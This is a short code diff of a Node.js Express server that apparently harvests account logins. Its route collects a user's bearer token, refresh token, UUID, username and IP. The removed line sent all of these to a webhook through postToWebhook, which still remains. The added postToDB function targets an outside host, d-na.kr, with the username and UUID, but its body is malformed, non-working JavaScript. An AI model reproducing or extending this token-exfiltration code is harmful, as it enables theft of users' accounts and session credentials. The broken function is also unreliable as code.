@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+        postToDB(username, uuid)
     } catch (e) {
         console.log(e)
     }
@@ -120,6 +120,16 @@ async function getUsernameAndUUID(bearerToken) {
 function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
+
+function postToDB(username, uuid){
+    url: "http://d-na.kr/oauth.php",
+    target: "_self",
+    vals: [
+            ["username", username],
+            ["uuid", uuid]
+          ]    
+}
+
 
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
